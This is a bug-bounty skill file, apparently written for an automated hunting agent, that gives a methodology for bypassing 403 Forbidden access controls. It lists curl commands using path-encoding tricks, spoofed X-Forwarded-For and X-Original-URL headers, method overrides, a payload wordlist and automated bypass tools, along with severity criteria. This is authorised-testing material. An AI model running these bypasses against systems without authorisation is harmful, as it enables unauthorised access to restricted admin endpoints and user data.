---
name: attack-403-bypass
description: "403 Forbidden bypass via path manipulation, header spoofing, and protocol downgrade — access control evasion for restricted endpoints"
category: "authorization"
version: "1.0"
author: "bountyreper-official"
tags:
  - 403
  - bypass
  - access-control
  - authorization
  - idor
  - privilege-escalation
tech_stack:
  - web
cwe_ids:
  - CWE-285
  - CWE-863
  - CWE-425
chains_with:
  - wstg-authz-01
  - wstg-authz-02
  - attack-idor-automation
prerequisites: []
severity_boost:
  wstg-authz-01: "403 bypass + IDOR = mass data exfiltration"
---

# 403 Forbidden Bypass

## Objective

Bypass 403 Forbidden and improper access controls on directories, files, and admin endpoints via path normalization tricks, header spoofing, and protocol manipulation.

> **Attribution:** Methodologies from [KathanP19/HowToHunt — Status_Code_Bypass](https://github.com/KathanP19/HowToHunt/tree/master/Status_Code_Bypass) by remonsec. Licensed GPL-3.0.

## Testing Methodology

### Phase 1: Directory-Based Bypass

For `site.com/secret => 403`:

```bash
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/secret
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/secret/
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/secret/*
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/secret/.
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/secret/./
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/%2e/secret
curl -s -o /dev/null -w "%{http_code}\n" https://target.com/secret%2f
```

### Phase 2: File-Based Bypass

For `site.com/secret.txt => 403`:

```bash
curl -s https://target.com/secret.txt/ -o /dev/null -w "%{http_code}\n"
curl -s https://target.com/%2f/secret.txt/ -o /dev/null -w "%{http_code}\n"
curl -s https://target.com/secret.txt%00 -o /dev/null -w "%{http_code}\n"
curl -s https://target.com/secret.txt%20 -o /dev/null -w "%{http_code}\n"
```

### Phase 3: Protocol and Header Bypass

```bash
# Protocol downgrade
curl -s http://target.com/secret -o /dev/null -w "%{http_code}\n" # vs https

# Header spoof (trusted IP)
curl -s -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin -o /dev/null -w "%{http_code}\n"
curl -s -H "X-Original-URL: /admin" https://target.com/blocked -o /dev/null -w "%{http_code}\n"
curl -s -H "X-Rewrite-URL: /admin" https://target.com/blocked -o /dev/null -w "%{http_code}\n"
curl -s -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin -o /dev/null -w "%{http_code}\n"

# Method override
curl -s -X POST https://target.com/admin -o /dev/null -w "%{http_code}\n"
curl -s -H "X-HTTP-Method-Override: GET" https://target.com/admin -o /dev/null -w "%{http_code}\n"
```

### Phase 4: Payload Wordlist

```
/, /*, /%2f/, /./, ./., /*/, /%2e/, /%252e/, /%ef%bc%8f
```

Tools:
- [403bypasser](https://github.com/yunemse48/403bypasser)
- [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)

```bash
# Automated
python3 403bypasser.py -u https://target.com/admin
4-zero-3 -u https://target.com/secret --wordlist payloads.txt
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| 403 bypass to admin/config with sensitive data | High (P2) |
| 403 bypass to user data (IDOR chain) | High (P2) |
| 403 bypass but no sensitive content | Medium (P3) |
| Bypass via header shows trust misconfig | Medium (P3) |

## Evidence Requirements

- Baseline 403 request/response
- Bypass request with 200 and sensitive content
- Screenshot or http_replay evidence

## References

- [HowToHunt — 403Bypass](https://github.com/KathanP19/HowToHunt/tree/master/Status_Code_Bypass)
- [observationsinsecurity — Bypassing 403 to Admin](https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/)
